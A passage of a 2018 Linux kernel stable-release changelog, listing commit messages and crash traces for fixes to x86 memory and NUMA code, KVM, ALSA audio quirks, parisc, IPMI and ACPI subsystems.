in respective pin controller node. This fixes support for MAX8997
interrupts and enables operation of wakeup from MAX8997 RTC alarm.
Signed-off-by: Marek Szyprowski
Fixes: 17419726aaa1 ("ARM: dts: add max8997 device node for exynos4210-origen board")
Cc:
Signed-off-by: Krzysztof Kozlowski
Signed-off-by: Greg Kroah-Hartman
commit d9f91499b0fe24359a48b5f2ddb0aec5f8ba8f4a
Author: Dave Jiang
Date: Thu Oct 25 13:26:45 2018 -0700
x86/numa\_emulation: Fix uniform-split numa emulation
commit c6ee7a548e2c291398b4f32c1f741c66b9f98e1c upstream.
The numa\_emulation() routine in the 'uniform' case walks through all the
physical 'memblk' instances and divides them into N emulated nodes with
split\_nodes\_size\_interleave\_uniform(). As each physical node is consumed it
is removed from the physical memblk array in the numa\_remove\_memblk\_from()
helper.
Since split\_nodes\_size\_interleave\_uniform() handles advancing the array as
the 'memblk' is consumed it is expected that the base of the array is
always specified as the argument.
Otherwise, on multi-socket (> 2) configurations the uniform-split
capability can generate an invalid numa configuration leading to boot
failures with signatures like the following:
rcu: INFO: rcu\_sched detected stalls on CPUs/tasks:
Sending NMI from CPU 0 to CPUs 2:
NMI backtrace for cpu 2
CPU: 2 PID: 1332 Comm: pgdatinit0 Not tainted 4.19.0-rc8-next-20181019-baseline #59
RIP: 0010:\_\_init\_single\_page.isra.74+0x81/0x90
[..]
Call Trace:
deferred\_init\_pages+0xaa/0xe3
deferred\_init\_memmap+0x18f/0x318
kthread+0xf8/0x130
? deferred\_free\_pages.isra.105+0xc9/0xc9
? kthread\_stop+0x110/0x110
ret\_from\_fork+0x35/0x40
Fixes: 1f6a2c6d9f121 ("x86/numa\_emulation: Introduce uniform split capability")
Signed-off-by: Dave Jiang
Signed-off-by: Dan Williams
Signed-off-by: Thomas Gleixner
Tested-by: Alexander Duyck
Reviewed-by: Dave Hansen
Cc: Borislav Petkov
Cc: "H. Peter Anvin"
Cc: Andy Lutomirski
Cc: Peter Zijlstra
Cc: stable@vger.kernel.org
Link: https://lkml.kernel.org/r/154049911459.2685845.9210186007479774286.stgit@dwillia2-desk3.amr.corp.intel.com
Signed-off-by: Greg Kroah-Hartman
commit e36453b681a9af008f93d00dce2a4fde978ebc72
Author: Sebastian Andrzej Siewior
Date: Wed Oct 17 12:34:32 2018 +0200
x86/mm/pat: Disable preemption around \_\_flush\_tlb\_all()
commit f77084d96355f5fba8e2c1fb3a51a393b1570de7 upstream.
The WARN\_ON\_ONCE(\_\_read\_cr3() != build\_cr3()) in switch\_mm\_irqs\_off()
triggers every once in a while during a snapshotted system upgrade.
The warning triggers since commit decab0888e6e ("x86/mm: Remove
preempt\_disable/enable() from \_\_native\_flush\_tlb()"). The callchain is:
get\_page\_from\_freelist() -> post\_alloc\_hook() -> \_\_kernel\_map\_pages()
with CONFIG\_DEBUG\_PAGEALLOC enabled.
Disable preemption during CR3 reset / \_\_flush\_tlb\_all() and add a comment
why preemption has to be disabled so it won't be removed accidentaly.
Add another preemptible() check in \_\_flush\_tlb\_all() to catch callers with
enabled preemption when PGE is enabled, because PGE enabled does not
trigger the warning in \_\_native\_flush\_tlb(). Suggested by Andy Lutomirski.
Fixes: decab0888e6e ("x86/mm: Remove preempt\_disable/enable() from \_\_native\_flush\_tlb()")
Signed-off-by: Sebastian Andrzej Siewior
Signed-off-by: Thomas Gleixner
Cc: Andy Lutomirski
Cc: Dave Hansen
Cc: Peter Zijlstra
Cc: Borislav Petkov
Cc: stable@vger.kernel.org
Link: https://lkml.kernel.org/r/20181017103432.zgv46nlu3hc7k4rq@linutronix.de
Signed-off-by: Greg Kroah-Hartman
commit 97dc505190eda3e7bacae731801e5fcdaa29f311
Author: Vitaly Kuznetsov
Date: Tue Oct 16 18:50:07 2018 +0200
x86/kvm/nVMX: allow bare VMXON state migration
commit a1b0c1c64dfef0cff8555bb708bfc5d7c66c6ca4 upstream.
It is perfectly valid for a guest to do VMXON and not do VMPTRLD. This
state needs to be preserved on migration.
Cc: stable@vger.kernel.org
Fixes: 8fcc4b5923af5de58b80b53a069453b135693304
Signed-off-by: Vitaly Kuznetsov
Signed-off-by: Paolo Bonzini
Signed-off-by: Greg Kroah-Hartman
commit 967afd9a748469cb23bc0118b173d3538e0c65b6
Author: He Zhe
Date: Tue Aug 14 23:33:42 2018 +0800
x86/corruption-check: Fix panic in memory\_corruption\_check() when boot option without value is provided
commit ccde460b9ae5c2bd5e4742af0a7f623c2daad566 upstream.
memory\_corruption\_check[{\_period|\_size}]()'s handlers do not check input
argument before passing it to kstrtoul() or simple\_strtoull(). The argument
would be a NULL pointer if each of the kernel parameters, without its
value, is set in command line and thus cause the following panic.
PANIC: early exception 0xe3 IP 10:ffffffff73587c22 error 0 cr2 0x0
[ 0.000000] CPU: 0 PID: 0 Comm: swapper Not tainted 4.18-rc8+ #2
[ 0.000000] RIP: 0010:kstrtoull+0x2/0x10
...
[ 0.000000] Call Trace
[ 0.000000] ? set\_corruption\_check+0x21/0x49
[ 0.000000] ? do\_early\_param+0x4d/0x82
[ 0.000000] ? parse\_args+0x212/0x330
[ 0.000000] ? rdinit\_setup+0x26/0x26
[ 0.000000] ? parse\_early\_options+0x20/0x23
[ 0.000000] ? rdinit\_setup+0x26/0x26
[ 0.000000] ? parse\_early\_param+0x2d/0x39
[ 0.000000] ? setup\_arch+0x2f7/0xbf4
[ 0.000000] ? start\_kernel+0x5e/0x4c2
[ 0.000000] ? load\_ucode\_bsp+0x113/0x12f
[ 0.000000] ? secondary\_startup\_64+0xa5/0xb0
This patch adds checks to prevent the panic.
Signed-off-by: He Zhe
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Cc: gregkh@linuxfoundation.org
Cc: kstewart@linuxfoundation.org
Cc: pombredanne@nexb.com
Cc: stable@vger.kernel.org
Link: http://lkml.kernel.org/r/1534260823-87917-1-git-send-email-zhe.he@windriver.com
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 9f775ed200281b296d4ff732fadcb8c1968ecbad
Author: Juergen Gross
Date: Wed Oct 10 08:14:54 2018 +0200
x86/xen: Fix boot loader version reported for PVH guests
commit 357d291ce035d1b757568058f3c9898c60d125b1 upstream.
The boot loader version reported via sysfs is wrong in case of the
kernel being booted via the Xen PVH boot entry. it should be 2.12
(0x020c), but it is reported to be 2.18 (0x0212).
As the current way to set the version is error prone use the more
readable variant (2 << 8) | 12.
Signed-off-by: Juergen Gross
Cc:  # 4.12
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Cc: boris.ostrovsky@oracle.com
Cc: bp@alien8.de
Cc: corbet@lwn.net
Cc: linux-doc@vger.kernel.org
Cc: xen-devel@lists.xenproject.org
Link: http://lkml.kernel.org/r/20181010061456.22238-2-jgross@suse.com
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 233b9d7df0e114c7e7c3674559fb0fc41ada3e8f
Author: Jiri Kosina
Date: Tue Sep 25 14:38:55 2018 +0200
x86/speculation: Enable cross-hyperthread spectre v2 STIBP mitigation
commit 53c613fe6349994f023245519265999eed75957f upstream.
STIBP is a feature provided by certain Intel ucodes / CPUs. This feature
(once enabled) prevents cross-hyperthread control of decisions made by
indirect branch predictors.
Enable this feature if
- the CPU is vulnerable to spectre v2
- the CPU supports SMT and has SMT siblings online
- spectre\_v2 mitigation autoselection is enabled (default)
After some previous discussion, this leaves STIBP on all the time, as wrmsr
on crossing kernel boundary is a no-no. This could perhaps later be a bit
more optimized (like disabling it in NOHZ, experiment with disabling it in
idle, etc) if needed.
Note that the synchronization of the mask manipulation via newly added
spec\_ctrl\_mutex is currently not strictly needed, as the only updater is
already being serialized by cpu\_add\_remove\_lock, but let's make this a
little bit more future-proof.
Signed-off-by: Jiri Kosina
Signed-off-by: Thomas Gleixner
Cc: Peter Zijlstra
Cc: Josh Poimboeuf
Cc: Andrea Arcangeli
Cc: "WoodhouseDavid"
Cc: Andi Kleen
Cc: Tim Chen
Cc: "SchauflerCasey"
Cc: stable@vger.kernel.org
Link: https://lkml.kernel.org/r/nycvar.YFH.7.76.1809251438240.15880@cbobk.fhfr.pm
Signed-off-by: Greg Kroah-Hartman
commit 1e3430e27c877d6819904a310a0c82a5013b7da2
Author: Takashi Iwai
Date: Mon Nov 5 12:28:07 2018 +0100
ALSA: hda - Fix incorrect clearance of thinkpad\_acpi hooks
commit 5e93a125f521efd00d71af31c2a301f3d46af48c upstream.
Since the commit c647f806b8c2 ("ALSA: hda - Allow multiple ADCs for
mic mute LED controls") we allow enabling the mic mute LED with
multiple ADCs. The commit changed the function return value to be
zero or a negative error, while this change was overlooked in the
thinkpad\_acpi helper code where it still expects a positive return
value for success. This eventually leads to a NULL dereference on a
system that has only a mic mute LED.
This patch corrects the return value check in the corresponding code
as well.
Bugzilla: https://bugzilla.kernel.org/show\_bug.cgi?id=201621
Fixes: c647f806b8c2 ("ALSA: hda - Allow multiple ADCs for mic mute LED controls")
Cc:
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit e3a6b6ed37b9626abbdf304b8e6fe492b4f84f59
Author: Alex Stanoev
Date: Sun Oct 28 16:55:12 2018 +0000
ALSA: ca0106: Disable IZD on SB0570 DAC to fix audio pops
commit ac237c28d5ac1b241d58b1b7b4b9fa10efb22fb5 upstream.
The Creative Audigy SE (SB0570) card currently exhibits an audible pop
whenever playback is stopped or resumed, or during silent periods of an
audio stream. Initialise the IZD bit to the 0 to eliminate these pops.
The Infinite Zero Detection (IZD) feature on the DAC causes the output
to be shunted to Vcap after 2048 samples of silence. This discharges the
AC coupling capacitor through the output and causes the aforementioned
pop/click noise.
The behaviour of the IZD bit is described on page 15 of the WM8768GEDS
datasheet: "With IZD=1, applying MUTE for 1024 consecutive input samples
will cause all outputs to be connected directly to VCAP. This also
happens if 2048 consecutive zero input samples are applied to all 6
channels, and IZD=0. It will be removed as soon as any channel receives
a non-zero input". I believe the second sentence might be referring to
IZD=1 instead of IZD=0 given the observed behaviour of the card.
This change should make the DAC initialisation consistent with
Creative's Windows driver, as this popping persists when initialising
the card in Linux and soft rebooting into Windows, but is not present on
a cold boot to Windows.
Signed-off-by: Alex Stanoev
Cc:
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 3e10f0f16c011bc52291a812c028349091081331
Author: Hans de Goede
Date: Tue Oct 16 12:18:21 2018 +0200
ALSA: hda: Add 2 more models to the power\_save blacklist
commit 5cb6b5fc013ee711d19bfc4e9deb8d6ae80741db upstream.
Power-saving is causing plops on audio start/stop on Dell Precision T3600
laptops and Intel DZ77BH boards, add these to the power\_save blacklist.
BugLink: https://bugzilla.redhat.com/show\_bug.cgi?id=1525104
Signed-off-by: Hans de Goede
Cc:
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit e989f4b3eb3cb641c70bb26a7379e88cc71220e0
Author: Jeremy Cline
Date: Thu Oct 11 15:49:17 2018 -0400
ALSA: hda - Add mic quirk for the Lenovo G50-30 (17aa:3905)
commit e7bb6ad5685f05685dd8a6a5eda7bfcd14d5f95b upstream.
The Lenovo G50-30, like other G50 models, has a Conexant codec that
requires a quirk for its inverted stereo dmic.
Bugzilla: https://bugzilla.redhat.com/show\_bug.cgi?id=1249364
Reported-by: Alexander Ploumistos
Tested-by: Alexander Ploumistos
Cc: stable@vger.kernel.org
Signed-off-by: Jeremy Cline
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 7ea3c76388212a5729cb22e2c6d824336a8be90e
Author: Hui Wang
Date: Wed Oct 10 11:57:25 2018 +0800
ALSA: hda/realtek - Fix the problem of the front MIC on the Lenovo M715
commit d06fb562bff5d14defdacbd92449bacbaedd5cdf upstream.
The front MIC on the Lenovo M715 can't record sound, after applying
the ALC294\_FIXUP\_LENOVO\_MIC\_LOCATION, the problem is fixed. So add
the pin configuration of this machine to the pin quirk table.
Cc:
Signed-off-by: Hui Wang
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 4306ad59a04fdd9a6949e5216e9b78e5b93eccd4
Author: Takashi Iwai
Date: Tue Oct 9 14:20:17 2018 +0200
ALSA: hda - Fix headphone pin config for ASUS G751
commit 5b7c5e1f4c36b99d0f694f38b9ad910f520cb7ef upstream.
BIOS on ASUS G751 doesn't seem to map the headphone pin (NID 0x16)
correctly. Add a quirk to address it, as well as chaining to the
previous fix for the microphone.
Reported-by: Håvard
Cc:
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 096cd55d78789727b2b6b272ba30b4d7930515ea
Author: Takashi Iwai
Date: Sun Oct 7 09:44:17 2018 +0200
ALSA: hda - Add quirk for ASUS G751 laptop
commit 11ba6111160290ccd35562f4e05cec08942a6c4c upstream.
ASUS G751 requires the extra COEF initialization to make it microphone
working properly.
Reported-and-tested-by: Håvard
Cc:
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit e41a6afda6399d018b321e7b320c15abbe549ea0
Author: Helge Deller
Date: Sun Oct 14 21:58:00 2018 +0200
parisc: Fix exported address of os\_hpmc handler
commit 99a3ae51d557d8e38a7aece65678a31f9db215ee upstream.
In the C-code we need to put the physical address of the hpmc handler in
the interrupt vector table (IVA) in order to get HPMCs working. Since
on parisc64 function pointers are indirect (in fact they are function
descriptors) we instead export the address as variable and not as
function.
This reverts a small part of commit f39cce654f9a ("parisc: Add
cfi\_startproc and cfi\_endproc to assembly code").
Signed-off-by: Helge Deller
Cc:  [4.9+]
Signed-off-by: Greg Kroah-Hartman
commit 72f6b9c076c93a79508d2f653f213be333096a97
Author: Helge Deller
Date: Fri Oct 12 22:37:46 2018 +0200
parisc: Fix map\_pages() to not overwrite existing pte entries
commit 3c229b3f2dd8133f61bb81d3cb018be92f4bba39 upstream.
Fix a long-existing small nasty bug in the map\_pages() implementation which
leads to overwriting already written pte entries with zero, \*if\* map\_pages() is
called a second time with an end address which isn't aligned on a pmd boundry.
This happens for example if we want to remap only the text segment read/write
in order to run alternative patching on the code. Exiting the loop when we
reach the end address fixes this.
Cc: stable@vger.kernel.org
Signed-off-by: Helge Deller
Signed-off-by: Greg Kroah-Hartman
commit dcfc49721c9a342d725782da7b2ab7bbb7ace8d1
Author: John David Anglin
Date: Sat Oct 6 13:11:30 2018 -0400
parisc: Fix address in HPMC IVA
commit 1138b6718ff74d2a934459643e3754423d23b5e2 upstream.
Helge noticed that the address of the os\_hpmc handler was not being
correctly calculated in the hpmc macro. As a result, PDCE\_CHECK would
fail to call os\_hpmc:
 e800009802e00000 0000000000000000 CC\_ERR\_CHECK\_HPMC
 37000f7302e00000 8040004000000000 CC\_ERR\_CPU\_CHECK\_SUMMARY
 f600105e02e00000 fffffff0f0c00000 CC\_MC\_HPMC\_MONARCH\_SELECTED
 140003b202e00000 000000000000000b CC\_ERR\_HPMC\_STATE\_ENTRY
 5600100b02e00000 00000000000001a0 CC\_MC\_OS\_HPMC\_LEN\_ERR
 5600106402e00000 fffffff0f0438e70 CC\_MC\_BR\_TO\_OS\_HPMC\_FAILED
 e800009802e00000 0000000000000000 CC\_ERR\_CHECK\_HPMC
 37000f7302e00000 8040004000000000 CC\_ERR\_CPU\_CHECK\_SUMMARY
 4000109f02e00000 0000000000000000 CC\_MC\_HPMC\_INITIATED
 4000101902e00000 0000000000000000 CC\_MC\_MULTIPLE\_HPMCS
 030010d502e00000 0000000000000000 CC\_CPU\_STOP
The address problem can be seen by dumping the fault vector:
0000000040159000 :
40159000: 63 6f 77 73 stb r15,-2447(dp)
40159004: 20 63 61 6e ldil L%b747000,r3
40159008: 20 66 6c 79 ldil L%-1c3b3000,r3
...
40159020: 08 00 02 40 nop
40159024: 20 6e 60 02 ldil L%15d000,r3
40159028: 34 63 00 00 ldo 0(r3),r3
4015902c: e8 60 c0 02 bv,n r0(r3)
40159030: 08 00 02 40 nop
40159034: 00 00 00 00 break 0,0
40159038: c0 00 70 00 bb,\*< r0,sar,40159840
4015903c: 00 00 00 00 break 0,0
Location 40159038 should contain the physical address of os\_hpmc:
000000004015d000 :
4015d000: 08 1a 02 43 copy r26,r3
4015d004: 01 c0 08 a4 mfctl iva,r4
4015d008: 48 85 00 68 ldw 34(r4),r5
This patch moves the address setup into initialize\_ivt to resolve the
above problem. I tested the change by dumping the HPMC entry after setup:
0000000040209020: 8000240
0000000040209024: 206a2004
0000000040209028: 34630ac0
000000004020902c: e860c002
0000000040209030: 8000240
0000000040209034: 1bdddce6
0000000040209038: 15d000
000000004020903c: 1a0
Signed-off-by: John David Anglin
Cc:
Signed-off-by: Helge Deller
Signed-off-by: Greg Kroah-Hartman
commit 316f31f13f3c5a339c9874575aeeb405ae26a148
Author: David Arcari
Date: Mon Aug 27 15:19:08 2018 -0400
mailbox: PCC: handle parse error
commit afd0b1fb22269f48d68fdf269891c653818c8047 upstream.
acpi\_pcc\_probe() calls acpi\_table\_parse\_entries\_array() but fails
to check for an error return. This in turn can result in calling
kcalloc() with a negative count as well as emitting the following
misleading erorr message:
[ 2.642015] Could not allocate space for PCC mbox channels
Fixes: 8f8027c5f935 (mailbox: PCC: erroneous error message when parsing ACPI PCCT)
Signed-off-by: David Arcari
Reviewed-by: Al Stone
Cc: 4.18+  # 4.18+
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Greg Kroah-Hartman
commit 8e071518d17a61ef07a388b5e3c4363e771225c1
Author: Jan Glauber
Date: Thu Oct 11 12:13:01 2018 +0200
ipmi: Fix timer race with module unload
commit 0711e8c1b4572d076264e71b0002d223f2666ed7 upstream.
Please note that below oops is from an older kernel, but the same
race seems to be present in the upstream kernel too.
---8<---
The following panic was encountered during removing the ipmi\_ssif
module:
[ 526.352555] Unable to handle kernel paging request at virtual address ffff000006923090
[ 526.360464] Mem abort info:
[ 526.363257] ESR = 0x86000007
[ 526.366304] Exception class = IABT (current EL), IL = 32 bits
[ 526.372221] SET = 0, FnV = 0
[ 526.375269] EA = 0, S1PTW = 0
[ 526.378405] swapper pgtable: 4k pages, 48-bit VAs, pgd = 000000008ae60416
[ 526.385185] [ffff000006923090] \*pgd=000000bffcffe803, \*pud=000000bffcffd803, \*pmd=0000009f4731a003, \*pte=0000000000000000
[ 526.396141] Internal error: Oops: 86000007 [#1] SMP
[ 526.401008] Modules linked in: nls\_iso8859\_1 ipmi\_devintf joydev input\_leds ipmi\_msghandler shpchp sch\_fq\_codel ib\_iser rdma\_cm iw\_cm ib\_cm ib\_core iscsi\_tcp libiscsi\_tcp libiscsi scsi\_transport\_iscsi ip\_tables x\_tables autofs4 btrfs zstd\_compress raid10 raid456 async\_raid6\_recov async\_memcpy async\_pq async\_xor async\_tx xor raid6\_pq libcrc32c raid1 raid0 multipath linear i2c\_smbus hid\_generic usbhid uas hid usb\_storage ast aes\_ce\_blk i2c\_algo\_bit aes\_ce\_cipher qede ttm crc32\_ce ptp crct10dif\_ce drm\_kms\_helper ghash\_ce syscopyarea sha2\_ce sysfillrect sysimgblt pps\_core fb\_sys\_fops sha256\_arm64 sha1\_ce mpt3sas qed drm raid\_class ahci scsi\_transport\_sas libahci gpio\_xlp i2c\_xlp9xx aes\_neon\_bs aes\_neon\_blk crypto\_simd cryptd aes\_arm64 [last unloaded: ipmi\_ssif]
[ 526.468085] CPU: 125 PID: 0 Comm: swapper/125 Not tainted 4.15.0-35-generic #38~lp1775396+build.1
[ 526.476942] Hardware name: To be filled by O.E.M. Saber/Saber, BIOS 0ACKL022 08/14/2018
[ 526.484932] pstate: 00400009 (nzcv daif +PAN -UAO)
[ 526.489713] pc : 0xffff000006923090
[ 526.493198] lr : call\_timer\_fn+0x34/0x178
[ 526.497194] sp : ffff000009b0bdd0
[ 526.500496] x29: ffff000009b0bdd0 x28: 0000000000000082
[ 526.505796] x27: 0000000000000002 x26: ffff000009515188
[ 526.511096] x25: ffff000009515180 x24: ffff0000090f1018
[ 526.516396] x23: ffff000009519660 x22: dead000000000200
[ 526.521696] x21: ffff000006923090 x20: 0000000000000100
[ 526.526995] x19: ffff809eeb466a40 x18: 0000000000000000
[ 526.532295] x17: 000000000000000e x16: 0000000000000007
[ 526.537594] x15: 0000000000000000 x14: 071c71c71c71c71c
[ 526.542894] x13: 0000000000000000 x12: 0000000000000000
[ 526.548193] x11: 0000000000000001 x10: ffff000009b0be88
[ 526.553493] x9 : 0000000000000000 x8 : 0000000000000005
[ 526.558793] x7 : ffff80befc1f8528 x6 : 0000000000000020
[ 526.564092] x5 : 0000000000000040 x4 : 0000000020001b20
[ 526.569392] x3 : 0000000000000000 x2 : ffff809eeb466a40
[ 526.574692] x1 : ffff000006923090 x0 : ffff809eeb466a40
[ 526.579992] Process swapper/125 (pid: 0, stack limit = 0x000000002eb50acc)
[ 526.586854] Call trace:
[ 526.589289] 0xffff000006923090
[ 526.592419] expire\_timers+0xc8/0x130
[ 526.596070] run\_timer\_softirq+0xec/0x1b0
[ 526.600070] \_\_do\_softirq+0x134/0x328
[ 526.603726] irq\_exit+0xc8/0xe0
[ 526.606857] \_\_handle\_domain\_irq+0x6c/0xc0
[ 526.610941] gic\_handle\_irq+0x84/0x188
[ 526.614679] el1\_irq+0xe8/0x180
[ 526.617822] cpuidle\_enter\_state+0xa0/0x328
[ 526.621993] cpuidle\_enter+0x34/0x48
[ 526.625564] call\_cpuidle+0x44/0x70
[ 526.629040] do\_idle+0x1b8/0x1f0
[ 526.632256] cpu\_startup\_entry+0x2c/0x30
[ 526.636174] secondary\_start\_kernel+0x11c/0x130
[ 526.640694] Code: bad PC value
[ 526.643800] ---[ end trace d020b0b8417c2498 ]---
[ 526.648404] Kernel panic - not syncing: Fatal exception in interrupt
[ 526.654778] SMP: stopping secondary CPUs
[ 526.658734] Kernel Offset: disabled
[ 526.662211] CPU features: 0x5800c38
[ 526.665688] Memory Limit: none
[ 526.668768] ---[ end Kernel panic - not syncing: Fatal exception in interrupt
Prevent mod\_timer from arming a timer that was already removed by
del\_timer during module unload.
Signed-off-by: Jan Glauber
Cc:  # 3.19
Signed-off-by: Corey Minyard
Signed-off-by: Greg Kroah-Hartman
commit b7e4138cae4b62fec4347af1f0116f93422052fb
Author: Masami Hiramatsu
Date: Sat Oct 20 18:47:53 2018 +0900
kprobes/x86: Use preempt\_enable() in optimized\_callback()
commit 2e62024c265aa69315ed02835623740030435380 upstream.
The following commit:
a19b2e3d7839 ("kprobes/x86: Remove IRQ disabling from ftrace-based/optimized kprobes”)
removed local\_irq\_save/restore() from optimized\_callback(), the handler
might be interrupted by the rescheduling interrupt and might be
rescheduled - so we must not use the preempt\_enable\_no\_resched() macro.
Use preempt\_enable() instead, to not lose preemption events.
[ mingo: Improved the changelog. ]
Reported-by: Nadav Amit
Signed-off-by: Masami Hiramatsu
Acked-by: Peter Zijlstra (Intel)
Cc:
Cc: Alexei Starovoitov
Cc: Andy Lutomirski
Cc: Borislav Petkov
Cc: Linus Torvalds
Cc: Oleg Nesterov
Cc: Thomas Gleixner
Cc: dwmw@amazon.co.uk
Fixes: a19b2e3d7839 ("kprobes/x86: Remove IRQ disabling from ftrace-based/optimized kprobes”)
Link: http://lkml.kernel.org/r/154002887331.7627.10194920925792947001.stgit@devbox
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 96f81d518d1aab2b66c4b4f57f3118cfe39c9aad
Author: Dan Williams
Date: Sat Oct 13 20:32:17 2018 -0700
acpi, nfit: Fix Address Range Scrub completion tracking
commit d3abaf43bab8d5b0a3c6b982100d9e2be96de4ad upstream.
The Address Range Scrub implementation tried to skip running scrubs
against ranges that were already scrubbed by the BIOS. Unfortunately
that support also resulted in early scrub completions as evidenced by
this debug output from nfit\_test:
nd\_region region9: ARS: range 1 short complete
nd\_region region3: ARS: range 1 short complete
nd\_region region4: ARS: range 2 ARS start (0)
nd\_region region4: ARS: range 2 short complete
...i.e. completions without any indications that the scrub was started.
This state of affairs was hard to see in the code due to the
proliferation of state bits and mistakenly trying to track done state
per-range when the completion is a global property of the bus.
So, kill the four ARS state bits (ARS\_REQ, ARS\_REQ\_REDO, ARS\_DONE, and
ARS\_SHORT), and replace them with just 2 request flags ARS\_REQ\_SHORT and
ARS\_REQ\_LONG. The implementation will still complete and reap the
results of BIOS initiated ARS, but it will not attempt to use that
information to affect the completion status of scrubbing the ranges from
a Linux perspective.
Instead, try to synchronously run a short ARS per range at init time and
schedule a long scrub in the background. If ARS is busy with an ARS
request, schedule both a short and a long scrub for when ARS returns to
idle. This logic also satisfies the intent of what ARS\_REQ\_REDO was
trying to achieve. The new rule is that the REQ flag stays set until the
next successful ars\_start() for that range.
With the new policy that the REQ flags are not cleared until the next
start, the implementation no longer loses requests as can be seen from
the following log:
nd\_region region3: ARS: range 1 ARS start short (0)
nd\_region region9: ARS: range 1 ARS start short (0)
nd\_region region3: ARS: range 1 complete
nd\_region region4: ARS: range 2 ARS start short (0)
nd\_region region9: ARS: range 1 complete
nd\_region region9: ARS: range 1 ARS start long (0)
nd\_region region4: ARS: range 2 complete
nd\_region region3: ARS: range 1 ARS start long (0)
nd\_region region9: ARS: range 1 complete
nd\_region region3: ARS: range 1 complete
nd\_region region4: ARS: range 2 ARS start long (0)
nd\_region region4: ARS: range 2 complete
...note that the nfit\_test emulated driver provides 2 buses, that is why
some of the range indices are duplicated. Notice that each range
now successfully completes a short and long scrub.
Cc:
Fixes: 14c73f997a5e ("nfit, address-range-scrub: introduce nfit\_spa->ars\_state")
Fixes: cc3d3458d46f ("acpi/nfit: queue issuing of ars when an uc error...")
Reported-by: Jacek Zloch
Reported-by: Krzysztof Rusocki
Reviewed-by: Dave Jiang
Signed-off-by: Dan Williams
Signed-off-by: Greg Kroah-Hartman
commit 8badf7c328107b4ae5a1959cdd381ec515b1b6a0
Author: Erik Schmauss
Date: Wed Oct 17 14:20:51 2018 -0700
ACPICA: AML Parser: fix parse loop to correctly skip erroneous extended opcodes
commit c64baa3a6fa207d112706bc5e7fd645cd8a8663f upstream.
AML opcodes come in two lengths: 1-byte opcodes and 2-byte, extended opcodes.
If an error occurs due to illegal opcodes during table load, the AML parser
needs to continue loading the table. In order to do this, it needs to skip
parsing of the offending opcode and operands associated with that opcode.
This change fixes the AML parse loop to correctly skip parsing of incorrect
extended opcodes. Previously, only the short opcodes were skipped correctly.
Signed-off-by: Erik Schmauss
Cc: All applicable
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Greg Kroah-Hartman
commit 22083c028d0b3ee419232d25ce90367e5b25df8f
Author: Erik Schmauss
Date: Wed Oct 17 14:09:35 2018 -0700
ACPICA: AML interpreter: add region addresses in global list during initialization
commit 4abb951b73ff0a8a979113ef185651aa3c8da19b upstream.
The table load process omitted adding the operation region address
range to the global list. This omission is problematic because the OS
queries the global list to check for address range conflicts before
deciding which drivers to load. This commit may result in warning
messages that look like the following:
[ 7.871761] ACPI Warning: system\_IO range 0x00000428-0x0000042F conflicts with op\_region 0x00000400-0x0000047F (\PMIO) (20180531/utaddress-213)
[ 7.871769] ACPI: If an ACPI driver is available for this device, you should use it instead of the native driver
However, these messages do not signify regressions. It is a result of
properly adding address ranges within the global address list.
Link: https://bugzilla.kernel.org/show\_bug.cgi?id=200011
Tested-by: Jean-Marc Lenoir
Signed-off-by: Erik Schmauss
Cc: All applicable
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Greg Kroah-Hartman
commit a3b026a380b7f6f5e83b0ed246d2b28593ae92bc
Author: Bart Van Assche
Date: Wed Oct 17 13:24:56 2018 -0700
ACPI / OSL: Use 'jiffies' as the time bassis for acpi\_os\_get\_timer()
commit 83b2348e2755db48fa8f40fdb791f366fabc0ba0 upstream.
Since acpi\_os\_get\_timer() may be called after the timer subsystem has
been suspended, use the jiffies counter instead of ktime\_get(). This
patch avoids that the following warning is reported during hibernation:
WARNING: CPU: 0 PID: 612 at kernel/time/timekeeping.c:751 ktime\_get+0x116/0x120
RIP: 0010:ktime\_get+0x116/0x120
Call Trace:
acpi\_os\_get\_timer+0xe/0x30
acpi\_ds\_exec\_begin\_control\_op+0x175/0x1de
acpi\_ds\_exec\_begin\_op+0x2c7/0x39a
acpi\_ps\_create\_op+0x573/0x5e4
acpi\_ps\_parse\_loop+0x349/0x1220
acpi\_ps\_parse\_aml+0x25b/0x6da
acpi\_ps\_execute\_method+0x327/0x41b
acpi\_ns\_evaluate+0x4e9/0x6f5
acpi\_ut\_evaluate\_object+0xd9/0x2f2
acpi\_rs\_get\_method\_data+0x8f/0x114
acpi\_walk\_resources+0x122/0x1b6
acpi\_pci\_link\_get\_current.isra.2+0x157/0x280
acpi\_pci\_link\_set+0x32f/0x4a0
irqrouter\_resume+0x58/0x80
syscore\_resume+0x84/0x380
hibernation\_snapshot+0x20c/0x4f0
hibernate+0x22d/0x3a6
state\_store+0x99/0xa0
kobj\_attr\_store+0x37/0x50
sysfs\_kf\_write+0x87/0xa0
kernfs\_fop\_write+0x1a5/0x240
\_\_vfs\_write+0xd2/0x410
vfs\_write+0x101/0x250
ksys\_write+0xab/0x120
\_\_x64\_sys\_write+0x43/0x50
do\_syscall\_64+0x71/0x220
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
Fixes: 164a08cee135 (ACPICA: Dispatcher: Introduce timeout mechanism for infinite loop detection)
Reported-by: Fengguang Wu
References: https://lists.01.org/pipermail/lkp/2018-April/008406.html
Signed-off-by: Bart Van Assche
Cc: 4.16+  # 4.16+
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Greg Kroah-Hartman
commit e792b324366a1aeb5357a879587783d328510d95
Author: Maciej S. Szmigiero
Date: Sun Sep 9 01:21:06 2018 +0200
pcmcia: Implement CLKRUN protocol disabling for Ricoh bridges
